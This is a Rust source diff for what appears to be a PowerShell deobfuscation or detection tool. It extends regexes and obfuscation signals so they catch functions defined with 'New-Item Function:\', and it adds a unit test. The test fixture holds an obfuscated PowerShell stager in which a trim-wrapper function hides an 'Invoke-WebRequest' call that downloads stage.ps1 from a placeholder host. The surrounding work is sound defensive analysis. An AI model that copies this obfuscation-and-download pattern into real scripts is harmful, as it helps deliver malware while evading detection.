@@ -953,7 +953,7 @@ static PS_NEW_ITEM_FUNCTION_DEF_RE: Lazy<Regex> = Lazy::new(|| {
 
 #[allow(clippy::expect_used)]
 static PS_NEW_ITEM_FUNCTION_PATH_RE: Lazy<Regex> = Lazy::new(|| {
-    Regex::new(r#"(?i)(?:^|[\s,;])-(?:p|path)\s+['"]?function:"#)
+    Regex::new(r#"(?i)(?:^|[\s,;])(?:-(?:p|path)\s+)?['"]?function:"#)
         .expect("ps new-item function path regex")
 });
 
@@ -963,6 +963,14 @@ static PS_NEW_ITEM_FUNCTION_NAME_RE: Lazy<Regex> = Lazy::new(|| {
         r#"(?i)(?:^|[\s,;])-(?:n|name)\s+['"]?([A-Za-z_][A-Za-z0-9_]*(?:-[A-Za-z0-9_]+)*)['"]?"#,
     )
     .expect("ps new-item function name regex")
+});
+
+#[allow(clippy::expect_used)]
+static PS_NEW_ITEM_FUNCTION_PATH_NAME_RE: Lazy<Regex> = Lazy::new(|| {
+    Regex::new(
+        r#"(?i)(?:^|[\s,;])(?:-(?:p|path)\s+)?['"]?function:[\\/]+([A-Za-z_][A-Za-z0-9_]*(?:-[A-Za-z0-9_]+)*)['"]?"#,
+    )
+    .expect("ps new-item function path-name regex")
 });
 
 #[allow(clippy::expect_used)]
@@ -3511,10 +3519,7 @@ fn literal_substring_extractor_defs(text: &str) -> Vec<(String, String, String)>
         {
             continue;
         }
-        let Some(name) = PS_NEW_ITEM_FUNCTION_NAME_RE
-            .captures(header)
-            .and_then(|caps| caps.get(1).map(|m| m.as_str()))
-        else {
+        let Some(name) = new_item_function_name(header) else {
             continue;
         };
         let block_open = full.end().saturating_sub(1);
@@ -3528,6 +3533,17 @@ fn literal_substring_extractor_defs(text: &str) -> Vec<(String, String, String)>
         defs.push((name.to_string(), params, body.to_string()));
     }
     defs
+}
+
+fn new_item_function_name(header: &str) -> Option<&str> {
+    PS_NEW_ITEM_FUNCTION_NAME_RE
+        .captures(header)
+        .and_then(|caps| caps.get(1).map(|m| m.as_str()))
+        .or_else(|| {
+            PS_NEW_ITEM_FUNCTION_PATH_NAME_RE
+                .captures(header)
+                .and_then(|caps| caps.get(1).map(|m| m.as_str()))
+        })
 }
 
 fn parse_leading_ps_param_block(body: &str) -> Option<String> {
@@ -5010,8 +5026,10 @@ impl PsObfuscationSignals {
     fn new(text: &str) -> Self {
         let lower = text.to_ascii_lowercase();
         let argument_list = lower.contains("-argumentlist");
-        let has_function_def =
-            lower.contains("function ") || lower.contains("-name ") || lower.contains("-n ");
+        let has_function_def = lower.contains("function ")
+            || lower.contains("-name ")
+            || lower.contains("-n ")
+            || lower.contains("new-item");
         let invoke_wrapper = has_function_def && lower.contains("invoke-expression");
         let dot_replace = lower.contains(".replace");
         let trim_extractor = has_function_def && lower.contains(".trim");
@@ -7267,6 +7285,24 @@ Clean '~~~Invoke-WebRequest -Uri https://ps-new-item-function-extractor.example/
                 "'Invoke-WebRequest -Uri https://ps-new-item-function-extractor.example/stage.ps1'"
             ),
             "New-Item function trim extractor call was not rewritten:\n{out}"
+        );
+    }
+
+    #[test]
+    fn literal_new_item_function_path_name_trim_extractor_call_is_rewritten() {
+        let text = r#"(New-Item Function:\Clean -Value {
+  param($value,$chars)
+  return $value.Trim($chars)
+});
+Clean '~~~Invoke-WebRequest -Uri https://ps-new-item-path-function-extractor.example/stage.ps1~~~' '~'"#;
+
+        let out = expand_literal_trim_extractor_calls(text);
+
+        assert!(
+            out.contains(
+                "'Invoke-WebRequest -Uri https://ps-new-item-path-function-extractor.example/stage.ps1'"
+            ),
+            "New-Item function path-name trim extractor call was not rewritten:\n{out}"
         );
     }
 
